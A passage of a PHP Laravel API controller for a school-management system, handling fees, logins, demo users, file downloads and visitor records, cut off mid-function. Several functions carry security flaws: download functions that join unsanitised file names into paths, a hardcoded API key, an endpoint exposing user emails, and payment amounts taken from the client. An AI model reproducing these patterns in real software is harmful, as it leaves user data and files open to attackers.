        if ($request->fees_group == "" || $request->fees_group != 1 && $request->fees_group != 2) {


            $validator = Validator::make($input, [
                'fees_group' => "required",
                'fees_type' => "required",
                'date' => "required",
                'amount' => "required"
            ]);
        } else {
            $validator = Validator::make($input, [
                'fees_group' => "required",
                'fees_type' => "required",
                'date' => "required"
            ]);
        }
        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
        }

        $combination = AramiscFeesMaster::where('fees_group_id', $request->fees_group)->where('fees_type_id', $request->fees_type)->where('school_id',$school_id)->count();

        if ($combination == 0) {
            $fees_master = new AramiscFeesMaster();
            $fees_master->fees_group_id = $request->fees_group;
            $fees_master->fees_type_id = $request->fees_type;
            $fees_master->date = date('Y-m-d', strtotime($request->date));
            if ($request->fees_group != 1 && $request->fees_group != 2) {
                $fees_master->amount = $request->amount;
            } else {
                $fees_master->amount = NULL;
            }
            $fees_master->academic_id = AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR();
            $result = $fees_master->save();
            if ($result) {
                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    return ApiBaseMethod::sendResponse(null, 'Fees Master added successfully');
                }
            } else {
                return ApiBaseMethod::sendError('Operation Failed.', $validator->errors());
            }
        } else {
            return ApiBaseMethod::sendError('Operation Failed.', $validator->errors());
        }
    }
    public function feesMasterUpdate(Request $request)
    {
        $input = $request->all();
        if ($request->fees_group == "" || $request->fees_group != 1 && $request->fees_group != 2) {


            $validator = Validator::make($input, [
                'fees_group' => "required",
                'fees_type' => "required",
                'date' => "required",
                'amount' => "required"
            ]);
        } else {
            $validator = Validator::make($input, [
                'fees_group' => "required",
                'fees_type' => "required",
                'date' => "required"
            ]);
        }
        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
        }

        $combination = AramiscFeesMaster::where('fees_group_id', $request->fees_group)->where('fees_type_id', $request->fees_type)->count();

        if ($combination == 0) {
            $fees_master = AramiscFeesMaster::find($request->id);
            $fees_master->fees_group_id = $request->fees_group;
            $fees_master->fees_type_id = $request->fees_type;
            $fees_master->date = date('Y-m-d', strtotime($request->date));
            if ($request->fees_group != 1 && $request->fees_group != 2) {
                $fees_master->amount = $request->amount;
            } else {
                $fees_master->amount = NULL;
            }
            $fees_master->academic_id = AramiscAcademicYear::SINGLE_SCHOOL_API_ACADEMIC_YEAR();
            $result = $fees_master->save();
            if ($result) {
                if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                    return ApiBaseMethod::sendResponse(null, 'Fees Master updated successfully');
                }
            } else {
                return ApiBaseMethod::sendError('Operation Failed.', $validator->errors());
            }
        } else {
            return ApiBaseMethod::sendError('Operation Failed.', $validator->errors());
        }
    }

    public function DemoUser(Request $request)
    {
        try {
            $student = User::where('role_id', '=', 2)->select('id', 'email')->first();
            $parent = User::where('role_id', '=', 3)->select('id', 'email')->first();
            $teacher = User::where('role_id', '=', 4)->select('id', 'email')->first();
            $data = [];
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data['student'] = $student->toArray();
                $data['parent'] = $parent->toArray();
                $data['teacher'] = $teacher->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
        } catch (\Throwable $th) {
            return ApiBaseMethod::sendError('Data not found', null);
        }


    }
     public function SaasDemoUser(Request $request,$school_id)
    {
        try {
            $superadmin = User::where('role_id', '=',1)->select('id', 'email')->first();
            $student = User::where('role_id', '=', 2)->select('id', 'email')->where('school_id',$school_id)->first();
            $parent = User::where('role_id', '=', 3)->select('id', 'email')->where('school_id',$school_id)->first();
            $teacher = User::where('role_id', '=', 4)->select('id', 'email')->where('school_id',$school_id)->first();
            $data = [];
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data['superadmin'] = $superadmin->toArray();
                $data['student'] = $student->toArray();
                $data['parent'] = $parent->toArray();
                $data['teacher'] = $teacher->toArray();
                return ApiBaseMethod::sendResponse($data, null);
            }
        } catch (\Throwable $th) {
            return ApiBaseMethod::sendError('Data not found', null);
        }

    }
    public function convertCurrency(Request $request)
    {
        $from_currency = $request->from_currency;
        $to_currency = $request->to_currency;
        $amount = $request->amount;
        $apikey = '2b0c0838869650ad445d';

        $from_Currency = urlencode($from_currency);
        $to_Currency = urlencode($to_currency);
        $query =  "{$from_Currency}_{$to_Currency}";
        $URL_STRING = "https://free.currconv.com/api/v7/convert?q=" . $query . "&compact=ultra&apiKey=2b0c0838869650ad445d";

        $json = file_get_contents($URL_STRING);
        $obj = json_decode($json, true);

        $val = floatval($obj["$query"]);


        $total = $val * $amount;
        return number_format($total, 2, '.', '');
    }
    public function studentFeesPayment(Request $request)
    {


        $input = $request->all();
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $validator = Validator::make($input, [
                'student_id' => 'required',
                'fees_type_id' => 'required',
                'amount' => 'required',
                'paid_by' => "required"
            ]);
        }
        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        $student_info = AramiscStudent::where('user_id', '=', $request->student_id)->first();

        $fees_payment = new AramiscFeesPayment();
        $fees_payment->student_id = $student_info->id;
        $fees_payment->fees_type_id = $request->fees_type_id;

        $fees_payment->discount_amount = !empty($request->discount_amount) ? $request->discount_amount : 0;
        $fees_payment->fine = !empty($request->fine) ? $request->fine : 0;
        $fees_payment->amount = floatval($request->amount);
        $fees_payment->payment_date = date('Y-m-d', strtotime(date('Y-m-d')));
        $fees_payment->payment_mode = $request->payment_mode;
        $fees_payment->created_by = $request->paid_by;
        $result = $fees_payment->save();

        if ($result) {
            return ApiBaseMethod::sendResponse(null, 'payment success');
        } else {
            return ApiBaseMethod::sendError('Operation Failed.', null);
        }
    }
    public function saas_studentFeesPayment(Request $request,$school)
    {


        $input = $request->all();
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            $validator = Validator::make($input, [
                'student_id' => 'required',
                'fees_type_id' => 'required',
                'amount' => 'required',
                'paid_by' => "required"
            ]);
        }
        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        $student_info = AramiscStudent::where('user_id', '=', $request->student_id)->first();

        $fees_payment = new AramiscFeesPayment();
        $fees_payment->student_id = $student_info->id;
        $fees_payment->fees_type_id = $request->fees_type_id;

        $fees_payment->discount_amount = !empty($request->discount_amount) ? $request->discount_amount : 0;
        $fees_payment->fine = !empty($request->fine) ? $request->fine : 0;
        $fees_payment->amount = floatval($request->amount);
        $fees_payment->payment_date = date('Y-m-d', strtotime(date('Y-m-d')));
        $fees_payment->payment_mode = $request->payment_mode;
        $fees_payment->created_by = $request->paid_by;
        $result = $fees_payment->save();

        if ($result) {
            return ApiBaseMethod::sendResponse(null, 'payment success');
        } else {
            return ApiBaseMethod::sendError('Operation Failed.', null);
        }
    }

    function DownloadContent($file_name)
    {
        $file = public_path() . '/uploads/upload_contents/' . $file_name;
        if (file_exists($file)) {
            return Response::download($file);
        }
    }
    function DownloadComplaint($file_name)
    {
        $file = public_path() . '/uploads/complaint/' . $file_name;
        if (file_exists($file)) {
            return Response::download($file);
        }
    }
    function DownloadVisitor($file_name)
    {
        $file = public_path() . '/uploads/visitor/' . $file_name;
        if (file_exists($file)) {
            return Response::download($file);
        }
    }
    function DownloadPostal($file_name)
    {
        $file = public_path() . '/uploads/postal/' . $file_name;
        if (file_exists($file)) {
            return Response::download($file);
        }
    }
    function DownloadDispatch($file_name)
    {
        $file = public_path() . '/uploads/postal/' . $file_name;
        if (file_exists($file)) {
            return Response::download($file);
        }
    }


    public function allSchools(Request $request)
    {
        $all_schools= AramiscSchool::select('id','school_name','is_enabled', 'active_status')->where('is_enabled','yes')->where('active_status',1)->get();
        if (ApiBaseMethod::checkUrl($request->fullUrl())) {
            return ApiBaseMethod::sendResponse($all_schools->toArray(), 'All schools retrieved successfully.');
        }
    }


    // RAYHAN

    public function saasLogin(Request $request)
    {

        $input = $request->all();
        $validator = Validator::make($input, [
            'email' => "required",
            'password' => "required",
            'school_id' => "required"
        ]);


        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }

        try {
            $user = User::where('school_id', $request->school_id)->where('email', $request->email)->first();
            if(!$user) {
                $user = User::where('school_id', $request->school_id)->where('username', $request->email)->first();
            }

            if(!$user) {
                $user = User::where('school_id', $request->school_id)->where('phone_number', $request->email)->first();
            }
            if ($user != "") {
                if (Hash::check($request->password, $user->password)) {

                    $data = [];

                    $accessToken = $user->createToken('AuthToken')->accessToken;
                    $token = $accessToken;
                    $data['accessToken'] = 'Bearer ' . $token;

                    $data['user'] = $user->toArray();
                    $role_id = $user->role_id;
                    if ($role_id == 2) {


                        $data['userDetails'] = DB::table('aramisc_students')->select('aramisc_students.*','aramisc_students.user_id as student_user_id', 'aramisc_students.id as s_id', 'aramisc_parents.*','aramisc_parents.user_id as parent_user_id')
                            ->join('aramisc_parents', 'aramisc_parents.id', '=', 'aramisc_students.parent_id')
                            ->where('aramisc_students.user_id', $user->id)
                            ->first();

                        $data['religion'] = DB::table('aramisc_students')->select('aramisc_base_setups.base_setup_name as name')
                            ->join('aramisc_base_setups', 'aramisc_base_setups.id', '=', 'aramisc_students.religion_id')
                            ->where('aramisc_students.user_id', $user->id)
                            ->first();

                        $data['blood_group'] = DB::table('aramisc_students')->select('aramisc_base_setups.base_setup_name as name')
                            ->join('aramisc_base_setups', 'aramisc_base_setups.id', '=', 'aramisc_students.bloodgroup_id')
                            ->where('aramisc_students.user_id', $user->id)
                            ->first();


                        $data['transport'] = DB::table('aramisc_students')
                            ->select('aramisc_vehicles.vehicle_no', 'aramisc_vehicles.vehicle_model', 'aramisc_staffs.full_name as driver_name', 'aramisc_vehicles.note')
                            ->join('aramisc_vehicles', 'aramisc_vehicles.id', '=', 'aramisc_students.vechile_id')
                            ->join('aramisc_staffs', 'aramisc_staffs.id', '=', 'aramisc_vehicles.driver_id')
                            ->where('aramisc_students.user_id', $user->id)
                            ->first();
                        $data['system_settings'] = DB::table('aramisc_general_settings')->where('school_id', $user->school_id)->first();
                        $data['TTL_RTL_status'] = '1=RTL,2=TTL';
                    } else if ($role_id == 3) {
                        $data['userDetails'] = AramiscParent::where('user_id', $user->id)->first();
                    } else {
                        $data['userDetails'] = AramiscStaff::where('user_id', $user->id)->first();
                    }

                    return ApiBaseMethod::sendResponse($data, 'Login successful.');
                } else {
                    return ApiBaseMethod::sendError('These credentials do not match our records.');
                }
            } else {
                return ApiBaseMethod::sendError('These credentials do not match our records.');
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }





    public function userPermission($role_id, $school_id, $is_saas){
        $permissions = [];
        if($role_id == 1){
            $permissions = ["all"];
        }else{
            $permissionIds = AssignPermission::where('role_id', $role_id)
            ->when($is_saas == 0, function($q)use($school_id) {
                $q->where('school_id', $school_id);
            })->pluck('permission_id')->toArray();

             $permissions = Permission::whereIn('id', $permissionIds)
                    ->pluck('route')->toArray();
        }
        return ApiBaseMethod::sendResponse($permissions, 'Successful.');
    }


    public function mobileLogin(Request $request)
    {
        $input = $request->all();
        $validator = Validator::make($input, [
            'email' => "required",
            'password' => "required"
        ]);


        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }

        try {
            $users = User::where('email', $request->email)->get();

            if(!$users->count()) {
                $users = User::where('username', $request->email)->get();
            }

            if(!$users->count()) {
                $users = User::where('phone_number', $request->email)->get();
            }

            $user = null;

            if($users->count() > 1){
                $match_user = collect();
                foreach($users as $user){
                    if (Hash::check($request->password, $user->password)) {
                        $match_user->add($user);
                    }
                }

                if ($match_user && count($match_user) > 1) {
                    $school_ids = $match_user->pluck('school_id')->unique();
                    $schools = AramiscSchool::whereIn('id', $school_ids)->pluck('school_name', 'id')->toArray();
                    
                    if (count($schools) === 1) {
                        $user = $match_user->first();
                    } else {
                        $response_schools = [];
                        foreach ($schools as $id => $name) {
                            $response_schools[] = [
                                'id' => $id, 
                                'name' => $name
                            ];
                        }
                        $data = ['multiple_school' => true, 'schools' => $response_schools];
                        return ApiBaseMethod::sendResponse($data, 'Please Select a school first');
                    }
                } else {
                    $user = $match_user->first();
                }
            } else{
                $user = $users->first();
            }

            if ($user != "") {
                if (Hash::check($request->password, $user->password)) {

                    $data = [];
                    $data['multiple_school'] = false;
                    $notifications = AramiscNotification::where('user_id',$user->id)->where('is_read',0)->count();
                    $data['user'] = $user->toArray();
                    $data['unread_notifications'] = @$notifications;
                    
                   
                    $role_id = $user->role_id;
                    
                    if($role_id == 2) {
                        $data['userDetails'] = DB::table('aramisc_students')->select('aramisc_students.*','aramisc_students.user_id as student_user_id', 'aramisc_students.id as s_id', 'aramisc_parents.*','aramisc_parents.user_id as parent_user_id')
                            ->leftJoin('aramisc_parents', 'aramisc_parents.id', '=', 'aramisc_students.parent_id')
                            ->where('aramisc_students.user_id', $user->id)
                            ->first();

                        if(!$data['userDetails']){
                            $data['userDetails'] = DB::table('aramisc_students')->select('aramisc_students.*','aramisc_students.user_id as student_user_id', 'aramisc_students.id as s_id')
                                ->where('aramisc_students.user_id', $user->id)
                                ->first();
                        }

                        $data['religion'] = DB::table('aramisc_students')->select('aramisc_base_setups.base_setup_name as name')
                            ->join('aramisc_base_setups', 'aramisc_base_setups.id', '=', 'aramisc_students.religion_id')
                            ->where('aramisc_students.user_id', $user->id)
                            ->first();

                        $data['blood_group'] = DB::table('aramisc_students')->select('aramisc_base_setups.base_setup_name as name')
                            ->join('aramisc_base_setups', 'aramisc_base_setups.id', '=', 'aramisc_students.bloodgroup_id')
                            ->where('aramisc_students.user_id', $user->id)
                            ->first();


                        $data['transport'] = DB::table('aramisc_students')
                            ->select('aramisc_vehicles.vehicle_no', 'aramisc_vehicles.vehicle_model', 'aramisc_staffs.full_name as driver_name', 'aramisc_vehicles.note')
                            ->join('aramisc_vehicles', 'aramisc_vehicles.id', '=', 'aramisc_students.vechile_id')
                            ->join('aramisc_staffs', 'aramisc_staffs.id', '=', 'aramisc_vehicles.driver_id')
                            ->where('aramisc_students.user_id', $user->id)
                            ->first();
                        $data['system_settings'] = DB::table('aramisc_general_settings')->first();
                        $data['TTL_RTL_status'] = '1=RTL,2=TTL';
                    } else if ($role_id == 3) {
                        $data['userDetails'] = AramiscParent::where('user_id', $user->id)->first();
                    } else {
                        $data['userDetails'] = AramiscStaff::where('user_id', $user->id)->first();
                    }

                    // $old_token=DB::table('oauth_access_tokens')->where('user_id',$user->id)->delete();

                    $accessToken=$user->createToken('AuthToken')->accessToken;
                    $token= $accessToken;
                    $data['accessToken']='Bearer '.$token;

                    return ApiBaseMethod::sendResponse($data, 'Login successful.');
                } else {
                    return ApiBaseMethod::sendError('These credentials do not match our records.');
                }
            } else {
                return ApiBaseMethod::sendError('These credentials do not match our records.');
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function get_class_name(Request $request, $id)
    { 
        $get_class_name = AramiscClass::select('class_name as name')->where('id', $id)->first();
        return $get_class_name;
    }
    public function saas_get_class_name(Request $request,$school_id, $id)
    {

        $get_class_name = AramiscClass::select('class_name as name')->where('id', $id)->where('school_id',$school_id)->first();
        return $get_class_name;
    }

    public function get_section_name(Request $request, $id)
    {
        $get_section_name = AramiscSection::select('section_name as name')->where('id', $id)->first();
        return $get_section_name;
    }
    public function saas_get_section_name(Request $request,$school_id, $id)
    {
        $get_section_name = AramiscSection::select('section_name as name')
            ->where('id', $id)
            ->where('school_id', $school_id)
            ->first();
        return $get_section_name;
    }
    public function get_teacher_name(Request $request, $id)
    {
        $get_teacher_name = AramiscStaff::select('full_name as name')->where('id', $id)->first();
        return $get_teacher_name;
    }
    public function saas_get_teacher_name(Request $request, $school_id, $id)
    {
        $get_teacher_name = AramiscStaff::select('full_name as name')->where('id', $id)->where('school_id', $school_id)->first();
        return $get_teacher_name;
    }
    public function get_subject_name(Request $request, $id)
    {
        $get_subject_name = AramiscSubject::select('subject_name as name')->where('id', $id)->first();
        return $get_subject_name;
    }
    public function saas_get_subject_name(Request $request, $school_id, $id)
    {
        $get_subject_name = AramiscSubject::select('subject_name as name')->where('id', $id)->where('school_id', $school_id)->first();
        return $get_subject_name;
    }
    public function get_room_name(Request $request, $id)
    {
        $get_room_name = AramiscClassRoom::select('room_no as name')->where('id', $id)->first();
        return $get_room_name;
    }
    public function saas_get_room_name(Request $request,$school_id, $id)
    {
        $get_room_name = AramiscClassRoom::select('room_no as name')->where('id', $id)->where('school_id', $school_id)->first();
        return $get_room_name;
    }
    public function get_class_period_name(Request $request, $id)
    {
        $get_class_period_name = AramiscClassTime::select('period as name', 'start_time', 'end_time')->where('id', $id)->first();
        return $get_class_period_name;
    }
    public function saas_get_class_period_name(Request $request,$school_id, $id)
    {
        $get_class_period_name = AramiscClassTime::select('period as name', 'start_time', 'end_time')->where('id', $id)->where('school_id', $school_id)->first();
        return $get_class_period_name;
    }

    public function visitor_index(Request $request)
    {
        try {
            $visitors = AramiscVisitor::get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($visitors->toArray(), 'Visitors retrieved successfully.');
            }
            return view('backEnd.admin.visitor', compact('visitors'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_visitor_index(Request $request, $school_id)
    {
        try {
            $visitors = AramiscVisitor::where('school_id',$school_id)->get();
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendResponse($visitors->toArray(), 'Visitors retrieved successfully.');
            }
            return view('backEnd.admin.visitor', compact('visitors'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function visitor_store(Request $request)
    {

        $input = $request->all();

        $validator = Validator::make($input, [
            'name' => "required|max:120",
            'phone' => "required|max:30",
            'purpose' => "required|max:250",
            'visitor_id' => "required|max:15",
            'no_of_person' => "required|max:10",
            'date' => "required",
            'in_time' => "required",
            'out_time' => "required",
            'file' => "sometimes|nullable|mimes:pdf,doc,docx,jpg,jpeg,png",
        ]);
        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }

        try {
            $maxFileSize = AramiscGeneralSettings::first('file_size')->file_size;
            $file = $request->file('content_file');
            $fileSize =  filesize($file);
            $fileSizeKb = ($fileSize / 1000000);
            if($fileSizeKb >= $maxFileSize){
                Toastr::error( 'Max upload file size '. $maxFileSize .' Mb is set in system', 'Failed');
                return redirect()->back();
            }

            $maxFileSize = AramiscGeneralSettings::first('file_size')->file_size;
            $file = $request->file('content_file');
            $fileSize =  filesize($file);
            $fileSizeKb = ($fileSize / 1000000);
            if($fileSizeKb >= $maxFileSize){
                Toastr::error( 'Max upload file size '. $maxFileSize .' Mb is set in system', 'Failed');
                return redirect()->back();
            }

            $fileName = "";
            if ($request->file('file') != "") {
                $file = $request->file('file');
                $fileName = md5($file->getClientOriginalName() . time()) . "." . $file->getClientOriginalExtension();
                $file->move('public/uploads/visitor/', $fileName);
                $fileName = 'public/uploads/visitor/' . $fileName;
            }

            $date = strtotime($request->date);

            $newformat = date('Y-m-d', $date);

            $visitor = new AramiscVisitor();
            $visitor->name = $request->name;
            $visitor->phone = $request->phone;
            $visitor->visitor_id = $request->visitor_id;
            $visitor->no_of_person = $request->no_of_person;
            $visitor->purpose = $request->purpose;
            $visitor->date = $newformat;
            $visitor->in_time = $request->in_time;
            $visitor->out_time = $request->out_time;
            $visitor->file = $fileName;
            $result = $visitor->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {

                    return ApiBaseMethod::sendResponse(null, 'Visitor has been created successfully.');
                }
                return ApiBaseMethod::sendError('Something went wrong, please try again.');
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect()->back();
                }
                Toastr::error('Operation Failed', 'Failed');
                return redirect()->back();
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_visitor_store(Request $request)
    {

        $input = $request->all();

        $validator = Validator::make($input, [
            'name' => "required|max:120",
            'phone' => "required|max:30",
            'purpose' => "required|max:250",
            'visitor_id' => "required|max:15",
            'no_of_person' => "required|max:10",
            'date' => "required",
            'in_time' => "required",
            'out_time' => "required",
            'school_id' => "required",
            'file' => "sometimes|nullable|mimes:pdf,doc,docx,jpg,jpeg,png",
        ]);
        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }

        try {
            $maxFileSize = AramiscGeneralSettings::first('file_size')->file_size;
            $file = $request->file('content_file');
            $fileSize =  filesize($file);
            $fileSizeKb = ($fileSize / 1000000);
            if($fileSizeKb >= $maxFileSize){
                Toastr::error( 'Max upload file size '. $maxFileSize .' Mb is set in system', 'Failed');
                return redirect()->back();
            }
            $maxFileSize = AramiscGeneralSettings::first('file_size')->file_size;
            $file = $request->file('content_file');
            $fileSize =  filesize($file);
            $fileSizeKb = ($fileSize / 1000000);
            if($fileSizeKb >= $maxFileSize){
                Toastr::error( 'Max upload file size '. $maxFileSize .' Mb is set in system', 'Failed');
                return redirect()->back();
            }

            $fileName = "";
            if ($request->file('file') != "") {
                $file = $request->file('file');
                $fileName = md5($file->getClientOriginalName() . time()) . "." . $file->getClientOriginalExtension();
                $file->move('public/uploads/visitor/', $fileName);
                $fileName = 'public/uploads/visitor/' . $fileName;
            }

            $date = strtotime($request->date);

            $newformat = date('Y-m-d', $date);

            $visitor = new AramiscVisitor();
            $visitor->name = $request->name;
            $visitor->phone = $request->phone;
            $visitor->visitor_id = $request->visitor_id;
            $visitor->no_of_person = $request->no_of_person;
            $visitor->purpose = $request->purpose;
            $visitor->date = $newformat;
            $visitor->in_time = $request->in_time;
            $visitor->out_time = $request->out_time;
            $visitor->file = $fileName;
            $visitor->school_id = $request->school_id;
            $result = $visitor->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {

                    return ApiBaseMethod::sendResponse(null, 'Visitor has been created successfully.');
                }
                return ApiBaseMethod::sendError('Something went wrong, please try again.');
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect()->back();
                }
                Toastr::error('Operation Failed', 'Failed');
                return redirect()->back();
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function visitor_edit(Request $request, $id)
    {

        try {
            $visitor = AramiscVisitor::find($id);
            $visitors = AramiscVisitor::all();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['visitor'] = $visitor->toArray();
                $data['visitors'] = $visitors->toArray();
                return ApiBaseMethod::sendResponse($data, 'Visitor retrieved successfully.');
            }
            return view('backEnd.admin.visitor', compact('visitor', 'visitors'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_visitor_edit(Request $request,$school_id, $id)
    {

        try {
            $visitor = AramiscVisitor::where('school_id',$school_id)->find($id);
            $visitors = AramiscVisitor::where('school_id',$school_id)->get();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                $data = [];
                $data['visitor'] = $visitor->toArray();
                $data['visitors'] = $visitors->toArray();
                return ApiBaseMethod::sendResponse($data, 'Visitor retrieved successfully.');
            }
            return view('backEnd.admin.visitor', compact('visitor', 'visitors'));
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function visitor_update(Request $request)
    {
        $input = $request->all();

        $validator = Validator::make($input, [
            'name' => "required|max:120",
            'phone' => "required|max:30",
            'purpose' => "required|max:250",
            'visitor_id' => "required|max:15",
            'no_of_person' => "required|max:10",
            'date' => "required",
            'in_time' => "required",
            'out_time' => "required",
            'file' => "sometimes|nullable|mimes:pdf,doc,docx,jpg,jpeg,png",
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $maxFileSize = AramiscGeneralSettings::first('file_size')->file_size;
            $file = $request->file('content_file');
            $fileSize =  filesize($file);
            $fileSizeKb = ($fileSize / 1000000);
            if($fileSizeKb >= $maxFileSize){
                Toastr::error( 'Max upload file size '. $maxFileSize .' Mb is set in system', 'Failed');
                return redirect()->back();
            }
            $fileName = "";
            if ($request->file('file') != "") {
                $visitor = AramiscVisitor::find($request->id);
                if ($visitor->file != "") {
                    $path = url('/') . '/public/uploads/visitor/' . $visitor->file;
                    if (file_exists($path)) {
                        unlink($path);
                    }
                }

                $file = $request->file('file');
                $fileName = md5($file->getClientOriginalName() . time()) . "." . $file->getClientOriginalExtension();
                $file->move('public/uploads/visitor/', $fileName);
                $fileName = 'public/uploads/visitor/' . $fileName;
            }

            $time = strtotime($request->date);

            $newformat = date('Y-m-d', $time);

            $visitor = AramiscVisitor::find($request->id);
            $visitor->name = $request->name;
            $visitor->phone = $request->phone;
            $visitor->visitor_id = $request->visitor_id;
            $visitor->no_of_person = $request->no_of_person;
            $visitor->purpose = $request->purpose;
            $visitor->date = $newformat;
            $visitor->in_time = $request->in_time;
            $visitor->out_time = $request->out_time;
            if ($fileName != "") {
                $visitor->file = $fileName;
            }
            $result = $visitor->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Visitor has been updated successfully.');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect('visitor');
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function saas_visitor_update(Request $request)
    {
        $input = $request->all();

        $validator = Validator::make($input, [
            'name' => "required|max:120",
            'phone' => "required|max:30",
            'purpose' => "required|max:250",
            'visitor_id' => "required|max:15",
            'no_of_person' => "required|max:10",
            'date' => "required",
            'in_time' => "required",
            'out_time' => "required",
            'school_id' => "required",
            'file' => "sometimes|nullable|mimes:pdf,doc,docx,jpg,jpeg,png",
        ]);

        if ($validator->fails()) {
            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                return ApiBaseMethod::sendError('Validation Error.', $validator->errors());
            }
            return redirect()->back()
                ->withErrors($validator)
                ->withInput();
        }
        try {
            $fileName = "";
            if ($request->file('file') != "") {
                $visitor = AramiscVisitor::find($request->id);
                if ($visitor->file != "") {
                    $path = url('/') . '/public/uploads/visitor/' . $visitor->file;
                    if (file_exists($path)) {
                        unlink($path);
                    }
                }

                $file = $request->file('file');
                $fileName = md5($file->getClientOriginalName() . time()) . "." . $file->getClientOriginalExtension();
                $file->move('public/uploads/visitor/', $fileName);
                $fileName = 'public/uploads/visitor/' . $fileName;
            }

            $time = strtotime($request->date);

            $newformat = date('Y-m-d', $time);

            $visitor = AramiscVisitor::find($request->id);
            $visitor->name = $request->name;
            $visitor->phone = $request->phone;
            $visitor->visitor_id = $request->visitor_id;
            $visitor->no_of_person = $request->no_of_person;
            $visitor->purpose = $request->purpose;
            $visitor->date = $newformat;
            $visitor->in_time = $request->in_time;
            $visitor->out_time = $request->out_time;
            $visitor->school_id = $request->school_id;
            if ($fileName != "") {
                $visitor->file = $fileName;
            }
            $result = $visitor->save();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Visitor has been updated successfully.');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect('visitor');
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }
    public function visitor_delete(Request $request, $id)
    {

        try {
            $visitor = AramiscVisitor::find($id);
            if ($visitor->file != "") {
                $path = url('/') . '/public/uploads/visitor/' . $visitor->file;
                if (file_exists($path)) {
                    unlink($path);
                }
            }
            $result = $visitor->delete();

            if (ApiBaseMethod::checkUrl($request->fullUrl())) {
                if ($result) {
                    return ApiBaseMethod::sendResponse(null, 'Visitor has been deleted successfully.');
                } else {
                    return ApiBaseMethod::sendError('Something went wrong, please try again.');
                }
            } else {
                if ($result) {
                    Toastr::success('Operation successful', 'Success');
                    return redirect('visitor');
                } else {
                    Toastr::error('Operation Failed', 'Failed');
                    return redirect()->back();
                }
            }
        } catch (\Exception $e) {
            return ApiBaseMethod::sendError('Error.', $e->getMessage());
        }
    }

    public function saas_visitor_delete(Request $request,$school_id, $id)
    {

        try {

            $visitor = AramiscVisitor::where('school_id',$school_id)->find($id);

            if ($visitor->file != "") {
